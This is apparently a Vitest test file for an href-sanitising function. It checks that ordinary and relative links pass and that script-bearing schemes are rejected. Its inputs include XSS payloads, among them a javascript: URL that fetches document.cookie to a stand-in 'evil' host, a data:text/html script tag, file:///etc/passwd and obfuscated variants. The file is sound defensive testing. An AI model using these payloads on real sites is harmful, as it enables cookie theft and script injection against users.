import { describe, it, expect } from 'vitest'
import { isSafeHref } from '@/lib/validation/url'

describe('isSafeHref', () => {
  it('allows http(s) absolute URLs', () => {
    expect(isSafeHref('https://proxmox.example.com')).toBe(true)
    expect(isSafeHref('http://192.168.1.10:5000')).toBe(true)
  })

  it('allows scheme-less relative paths and fragments', () => {
    expect(isSafeHref('#')).toBe(true)        // default tile placeholder
    expect(isSafeHref('/config')).toBe(true)
    expect(isSafeHref('')).toBe(true)         // unset
  })

  it('blocks javascript: scheme (stored XSS vector)', () => {
    expect(isSafeHref('javascript:alert(1)')).toBe(false)
    expect(isSafeHref('JavaScript:alert(document.cookie)')).toBe(false)
    expect(isSafeHref("javascript:fetch('//evil/?c='+document.cookie)//")).toBe(false)
  })

  it('blocks data: and other script-bearing schemes', () => {
    expect(isSafeHref('data:text/html,<script>alert(1)</script>')).toBe(false)
    expect(isSafeHref('vbscript:msgbox(1)')).toBe(false)
    expect(isSafeHref('file:///etc/passwd')).toBe(false)
  })

  it('blocks control-char / whitespace obfuscation that browsers normalize', () => {
    expect(isSafeHref('java\tscript:alert(1)')).toBe(false)
    expect(isSafeHref('java\nscript:alert(1)')).toBe(false)
    expect(isSafeHref('  javascript:alert(1)')).toBe(false)
    expect(isSafeHref('\x01javascript:alert(1)')).toBe(false)
  })
})
